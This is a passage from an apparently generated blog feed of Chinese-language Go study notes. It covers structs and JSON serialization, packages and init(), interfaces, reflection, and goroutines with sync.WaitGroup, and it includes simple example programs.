class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="结构体字段的可见性"><a href="#结构体字段的可见性" class="headerlink" title="结构体字段的可见性"></a>结构体字段的可见性</h4><p>真的很方便，没有private,public这些花里胡哨的</p>
<p>结构体中字段大写开头表示可公开访问，小写表示私有（仅在定义当前结构体的包中可访问）</p>
<h4 id="结构体与JSON序列化"><a href="#结构体与JSON序列化" class="headerlink" title="结构体与JSON序列化"></a>结构体与JSON序列化</h4><p>这么多后端语言，瞧把大家逼疯了，统一出了一个json</p>
<p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写。同时也易于机器解析和生成。JSON键值对是用来保存JS对象的一种方式，键/值对组合中的键名写在前面并用双引号<code>&quot;&quot;</code>包裹，使用冒号<code>:</code>分隔，然后紧接着值；多个键值之间使用英文<code>,</code>分隔</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//JSON</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Student struct</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID   <span class="keyword">int</span> <span class="string">`json:&quot;id!!!&quot;`</span> <span class="comment">//Tag</span></span><br><span class="line">	Name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewStudent student的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewStudent</span><span class="params">(id <span class="keyword">int</span>, name <span class="keyword">string</span>)</span> <span class="title">Student</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> Student&#123;</span><br><span class="line">		ID:   id,</span><br><span class="line">		Name: name,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// class struct</span></span><br><span class="line"><span class="keyword">type</span> class <span class="keyword">struct</span> &#123;</span><br><span class="line">	Title    <span class="keyword">string</span></span><br><span class="line">	Students []Student</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// create a class</span></span><br><span class="line">	c := class&#123;</span><br><span class="line">		Title:    <span class="string">&quot;shanghai zoo&quot;</span>,</span><br><span class="line">		Students: <span class="built_in">make</span>([]Student, <span class="number">0</span>, <span class="number">20</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// insert member</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		temp := NewStudent(i, fmt.Sprintf(<span class="string">&quot;stu%02d&quot;</span>, i))</span><br><span class="line">		c.Students = <span class="built_in">append</span>(c.Students, temp)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(c)</span><br><span class="line">	<span class="comment">// JSON 序列化 ：GO -&gt; JSOn</span></span><br><span class="line">	data, err := json.Marshal(c)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;json marshal failed, err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, data)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, data)</span><br><span class="line">	fmt.Println()</span><br><span class="line">	<span class="comment">// JSON 反序列化 ：JSON -&gt; GO</span></span><br><span class="line">	jsonStr := <span class="string">`&#123;&quot;Title&quot;:&quot;shanghai zoo&quot;,&quot;Students&quot;:[&#123;&quot;ID&quot;:0,&quot;Name&quot;:&quot;stu00&quot;&#125;,&#123;&quot;ID&quot;:1,&quot;Name&quot;:&quot;stu01&quot;&#125;,&#123;&quot;ID&quot;:2,&quot;Name&quot;:&quot;stu02&quot;&#125;,&#123;&quot;ID&quot;:3,&quot;Name&quot;:&quot;stu03&quot;&#125;,&#123;&quot;ID&quot;:4,&quot;Name&quot;:&quot;stu04&quot;&#125;]&#125;`</span></span><br><span class="line">	<span class="keyword">var</span> c2 class</span><br><span class="line">	err = json.Unmarshal([]<span class="keyword">byte</span>(jsonStr), &amp;c2)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;json unmarshal failed, err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(c2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="final-小结"><a href="#final-小结" class="headerlink" title="final(小结)"></a>final(小结)</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用“面向对象”的思维方式编写一个学生信息管理系统。</span></span><br><span class="line"><span class="comment">// 学生有id、姓名、年龄、分数等信息</span></span><br><span class="line"><span class="comment">// 程序提供展示学生列表、添加学生、编辑学生信息、删除学生等功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Student struct</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID    <span class="keyword">int</span></span><br><span class="line">	Name  <span class="keyword">string</span></span><br><span class="line">	Age   <span class="keyword">int</span></span><br><span class="line">	Score <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewStudent Student的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewStudent</span><span class="params">(id <span class="keyword">int</span>, name <span class="keyword">string</span>, age <span class="keyword">int</span>, score <span class="keyword">int</span>)</span> *<span class="title">Student</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;Student&#123;</span><br><span class="line">		ID:    id,</span><br><span class="line">		Name:  name,</span><br><span class="line">		Age:   age,</span><br><span class="line">		Score: score,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// List struct</span></span><br><span class="line"><span class="keyword">type</span> List <span class="keyword">struct</span> &#123;</span><br><span class="line">	Student []Student</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ShowList List 展示列表内学生的信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l List)</span> <span class="title">ShowList</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> l.Student &#123;</span><br><span class="line">		fmt.Println(value)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AddStudent List 增添学生</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">AddStudent</span><span class="params">(id <span class="keyword">int</span>, name <span class="keyword">string</span>, age <span class="keyword">int</span>, score <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	temp := NewStudent(id, name, age, score)</span><br><span class="line">	l.Student = <span class="built_in">append</span>(l.Student, *temp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DeleteStudent List 删除学生(按编号删除，因为编号必唯一)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">DeleteStudent</span><span class="params">(id <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> index, value := <span class="keyword">range</span> l.Student &#123;</span><br><span class="line">		<span class="keyword">if</span> value.ID == id &#123;</span><br><span class="line">			l.Student = <span class="built_in">append</span>(l.Student[:index], l.Student[index+<span class="number">1</span>:]...)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SetStudent List 修改列表中学生信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *List)</span> <span class="title">SetStudent</span><span class="params">(id <span class="keyword">int</span>, name <span class="keyword">string</span>, age <span class="keyword">int</span>, score <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> index, value := <span class="keyword">range</span> l.Student &#123;</span><br><span class="line">		<span class="keyword">if</span> value.ID == id &#123;</span><br><span class="line">			l.Student[index].ID = id</span><br><span class="line">			l.Student[index].Name = name</span><br><span class="line">			l.Student[index].Age = age</span><br><span class="line">			l.Student[index].Score = score</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// create a list</span></span><br><span class="line">	List := List&#123;</span><br><span class="line">		Student: <span class="built_in">make</span>([]Student, <span class="number">0</span>, <span class="number">20</span>),</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// append</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		List.AddStudent(i, fmt.Sprintf(<span class="string">&quot;stu%02d&quot;</span>, i), rand.Intn(<span class="number">21</span>), rand.Intn(<span class="number">101</span>))</span><br><span class="line">	&#125;</span><br><span class="line">	List.ShowList()</span><br><span class="line">	List.SetStudent(<span class="number">4</span>, <span class="string">&quot;xiaoyuyu&quot;</span>, <span class="number">3</span>, <span class="number">100</span>)</span><br><span class="line">	List.DeleteStudent(<span class="number">3</span>)</span><br><span class="line">	fmt.Println()</span><br><span class="line">	List.ShowList()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>GO_note2</title>
    <url>/2020/02/28/GO-note2/</url>
    <content><![CDATA[<p>GO入门学习遇到的一些小贴士，给自己当note</p>
<span id="more"></span>

<p>学习资料：<a href="https://www.liwenzhou.com/posts/Go/go_menu/">https://www.liwenzhou.com/posts/Go/go_menu/</a></p>
<h3 id="Package"><a href="#Package" class="headerlink" title="Package"></a>Package</h3><p>注意事项：</p>
<ul>
<li>import导入语句通常放在文件开头包声明语句的下面。</li>
<li>导入的包名需要使用双引号包裹起来。</li>
<li>包名是从<code>$GOPATH/src/</code>后开始计算的，使用<code>/</code>进行路径分隔。</li>
<li>Go语言中禁止循环导入包。</li>
</ul>
<p>在Go语言程序执行时导入包语句会自动触发包内部<code>init()</code>函数的调用。需要注意的是： <code>init()</code>函数没有参数也没有返回值。 <code>init()</code>函数在程序运行时自动被调用执行，不能在代码中主动调用它</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> calc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Add x+y</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Add</span><span class="params">(x, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	ret := x + y</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sub x-y</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Sub</span><span class="params">(x, y <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	ret := x - y</span><br><span class="line">	<span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最早执行，全局变量、常量声明之前</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;calc.init()!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;basic/package/calc&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ret := calc.Add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(ret)</span><br><span class="line">	ret = calc.Sub(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">	fmt.Println(ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>在Go语言中接口（interface）是一种类型，一种抽象的类型</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Dog struct</span></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cat struct</span></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Say Cat</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c Cat)</span> <span class="title">Say</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;miao mio miao~&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Say Dog</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d Dog)</span> <span class="title">Say</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;wang wang wang!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Person struct</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Say Person</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span> <span class="title">Say</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;ying ying ying……&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把所有有say()方法的类型用一个sayer接口同意包裹</span></span><br><span class="line"><span class="keyword">type</span> sayer <span class="keyword">interface</span> &#123;</span><br><span class="line">	Say()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hit</span><span class="params">(arg sayer)</span></span> &#123;</span><br><span class="line">	arg.Say()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	mao := Cat&#123;&#125;</span><br><span class="line">	gou := Dog&#123;&#125;</span><br><span class="line">	ren := Person&#123;</span><br><span class="line">		Name: <span class="string">&quot;xiaoyuyu&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	hit(mao)</span><br><span class="line">	hit(gou)</span><br><span class="line">	hit(ren)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>空接口有点东西</p>
<p>想要判断空接口中的值这个时候就可以使用类型断言</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空接口</span></span><br><span class="line"><span class="comment">// 接口中没有定义任何方法</span></span><br><span class="line"><span class="comment">// 可以接受任意值</span></span><br><span class="line"><span class="comment">// 一般不用提前定义</span></span><br><span class="line"><span class="comment">//type xxx interface&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> x <span class="keyword">interface</span>&#123;&#125; <span class="comment">//定义一个空接口</span></span><br><span class="line">	<span class="keyword">var</span> m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;, <span class="number">20</span>)</span><br><span class="line">	m[<span class="string">&quot;aaa&quot;</span>] = <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	m[<span class="string">&quot;333&quot;</span>] = <span class="number">18</span></span><br><span class="line">	m[<span class="string">&quot;hobby&quot;</span>] = []<span class="keyword">string</span>&#123;<span class="string">&quot;football&quot;</span>, <span class="string">&quot;basketball&quot;</span>, <span class="string">&quot;swim&quot;</span>&#125;</span><br><span class="line">	fmt.Println(m)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//judge type</span></span><br><span class="line">	<span class="comment">// 断言</span></span><br><span class="line">	x = <span class="string">&quot;xiaoyuyu&quot;</span></span><br><span class="line">	value, ok := x.(<span class="keyword">bool</span>)</span><br><span class="line">	<span class="keyword">if</span> ok &#123;</span><br><span class="line">		fmt.Println(value)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;类型断言失败&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="反射-reflect"><a href="#反射-reflect" class="headerlink" title="反射(reflect)"></a>反射(reflect)</h3><p>支持反射的语言可以在程序编译期将变量的反射信息，如字段名称、类型信息、结构体信息等整合到可执行文件中，并给程序提供接口访问反射信息，这样就可以在程序运行期获取类型的反射信息，并且有能力修改它们</p>
<p>想要在函数中通过反射修改变量的值，需要注意函数参数传递的是值拷贝，必须传递变量地址才能修改变量值。而反射中使用专有的<code>Elem()</code>方法来获取指针对应的值</p>
<p><code>IsNil()</code>常被用于判断指针是否为空；<code>IsValid()</code>常被用于判定返回值是否有效</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reflectType</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	obj := reflect.TypeOf(x)</span><br><span class="line">	fmt.Println(obj, obj.Name(), obj.Kind())</span><br><span class="line">	<span class="comment">// fmt.Printf(&quot;%T\n&quot;, reflect.TypeOf(x)) //传递的是一个指针，指针内容是类型 *reflect.rtype</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reflectValue</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	value := reflect.ValueOf(x)</span><br><span class="line">	fmt.Println(x)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%T\n&quot;</span>, value) <span class="comment">//reflect.Value</span></span><br><span class="line">	<span class="comment">//如何获得传入时类型</span></span><br><span class="line">	k := value.Kind()</span><br><span class="line">	<span class="keyword">switch</span> k &#123;</span><br><span class="line">	<span class="keyword">case</span> reflect.Int64:</span><br><span class="line">		<span class="comment">// v.Int()从反射中获取整型的原始值，然后通过int64()强制类型转换</span></span><br><span class="line">		fmt.Printf(<span class="string">&quot;type is int64, value is %d\n&quot;</span>, <span class="keyword">int64</span>(value.Int()))</span><br><span class="line">	<span class="keyword">case</span> reflect.Float32:</span><br><span class="line">		<span class="comment">// v.Float()从反射中获取浮点型的原始值，然后通过float32()强制类型转换</span></span><br><span class="line">		fmt.Printf(<span class="string">&quot;type is float32, value is %f\n&quot;</span>, <span class="keyword">float32</span>(value.Float()))</span><br><span class="line">	<span class="keyword">case</span> reflect.Float64:</span><br><span class="line">		<span class="comment">// v.Float()从反射中获取浮点型的原始值，然后通过float64()强制类型转换</span></span><br><span class="line">		fmt.Printf(<span class="string">&quot;type is float64, value is %f\n&quot;</span>, <span class="keyword">float64</span>(value.Float()))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reflectSetValue</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	v := reflect.ValueOf(x)</span><br><span class="line">	<span class="comment">// 反射中使用 Elem()方法获取指针对应的值</span></span><br><span class="line">	<span class="keyword">if</span> v.Elem().Kind() == reflect.Int64 &#123;</span><br><span class="line">		v.Elem().SetInt(<span class="number">200</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Dog struct</span></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">//get type</span></span><br><span class="line">	reflectType(<span class="string">&quot;xiaoyuyu&quot;</span>)</span><br><span class="line">	reflectType(<span class="number">12</span>)</span><br><span class="line">	c := Dog&#123;&#125;</span><br><span class="line">	reflectType(c)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//get value</span></span><br><span class="line">	<span class="keyword">var</span> a <span class="keyword">int64</span> = <span class="number">32</span></span><br><span class="line">	reflectValue(a)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//set value</span></span><br><span class="line">	<span class="keyword">var</span> b <span class="keyword">int64</span> = <span class="number">100</span></span><br><span class="line">	reflectSetValue(&amp;b)</span><br><span class="line">	fmt.Println(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="结构体反射"><a href="#结构体反射" class="headerlink" title="结构体反射"></a>结构体反射</h3><p>任意值通过<code>reflect.TypeOf()</code>获得反射对象信息后，如果它的类型是结构体，可以通过反射值对象（<code>reflect.Type</code>）的<code>NumField()</code>和<code>Field()</code>方法获得结构体成员的详细信息</p>
<h4 id="StructField类型"><a href="#StructField类型" class="headerlink" title="StructField类型"></a>StructField类型</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> StructField <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">// Name是字段的名字。PkgPath是非导出字段的包路径，对导出字段该字段为&quot;&quot;。</span></span><br><span class="line">    <span class="comment">// 参见http://golang.org/ref/spec#Uniqueness_of_identifiers</span></span><br><span class="line">    Name    <span class="keyword">string</span></span><br><span class="line">    PkgPath <span class="keyword">string</span></span><br><span class="line">    Type      Type      <span class="comment">// 字段的类型</span></span><br><span class="line">    Tag       StructTag <span class="comment">// 字段的标签</span></span><br><span class="line">    Offset    <span class="keyword">uintptr</span>   <span class="comment">// 字段在结构体中的字节偏移量</span></span><br><span class="line">    Index     []<span class="keyword">int</span>     <span class="comment">// 用于Type.FieldByIndex时的索引切片</span></span><br><span class="line">    Anonymous <span class="keyword">bool</span>      <span class="comment">// 是否匿名字段</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Field(i int) StructField</td>
<td>根据索引，返回索引对应的结构体字段的信息。</td>
</tr>
<tr>
<td>NumField() int</td>
<td>返回结构体成员字段数量。</td>
</tr>
<tr>
<td>FieldByName(name string) (StructField, bool)</td>
<td>根据给定字符串返回字符串对应的结构体字段的信息。</td>
</tr>
<tr>
<td>FieldByIndex(index []int) StructField</td>
<td>多层成员访问时，根据 []int 提供的每个结构体的字段索引，返回字段的信息。</td>
</tr>
<tr>
<td>FieldByNameFunc(match func(string) bool) (StructField,bool)</td>
<td>根据传入的匹配函数匹配需要的字段。</td>
</tr>
<tr>
<td>NumMethod() int</td>
<td>返回该类型的方法集中方法的数目</td>
</tr>
<tr>
<td>Method(int) Method</td>
<td>返回该类型方法集中的第i个方法</td>
</tr>
<tr>
<td>MethodByName(string)(Method, bool)</td>
<td>根据方法名返回该类型方法集中的方法</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>GO_note3_并发</title>
    <url>/2020/02/29/GO-note3-%E5%B9%B6%E5%8F%91/</url>
    <content><![CDATA[<p>GO入门学习遇到的一些小贴士，给自己当note</p>
<span id="more"></span>

<p>学习资料：<a href="https://www.liwenzhou.com/posts/Go/go_menu/">https://www.liwenzhou.com/posts/Go/go_menu/</a></p>
<h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><p>并发：同一时间段内执行多个任务（你在用微信和两个女朋友聊天）</p>
<p>并行：同一时刻执行多个任务（你和你朋友都在用微信和女朋友聊天）</p>
<h4 id="goroutine"><a href="#goroutine" class="headerlink" title="goroutine"></a>goroutine</h4><p>两个例子</p>
<p>1.basic</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="comment">// &quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;hello xiaoyuyu~&quot;</span>)</span><br><span class="line">	wg.Done() <span class="comment">//计数牌-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">//开启一个主goroutine去执行main</span></span><br><span class="line">	wg.Add(<span class="number">1</span>) <span class="comment">//计数牌+1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> hello() <span class="comment">//开启一个goroutine去执行hello()</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;hello main!&quot;</span>)</span><br><span class="line">	<span class="comment">// time.Sleep(time.Second)</span></span><br><span class="line"></span><br><span class="line">	wg.Wait() <span class="comment">//阻塞，等所有小弟干完活才收工</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>2.闭包</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="comment">// &quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">//开启一个主goroutine去执行main</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++ &#123;</span><br><span class="line">		wg.Add(<span class="number">1</span>)        <span class="comment">//计数牌+1</span></span><br><span class="line">		<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123; <span class="comment">////开启一个goroutine去执行</span></span><br><span class="line">			fmt.Println(<span class="string">&quot;hello&quot;</span>, i)</span><br><span class="line">			wg.Done() <span class="comment">//计数牌-1</span></span><br><span class="line">		&#125;(i)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(<span class="string">&quot;hello main!&quot;</span>)</span><br><span class="line">	<span class="comment">// time.Sleep(time.Second)</span></span><br><span class="line"></span><br><span class="line">	wg.Wait() <span class="comment">//阻塞，等所有小弟干完活才收工</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

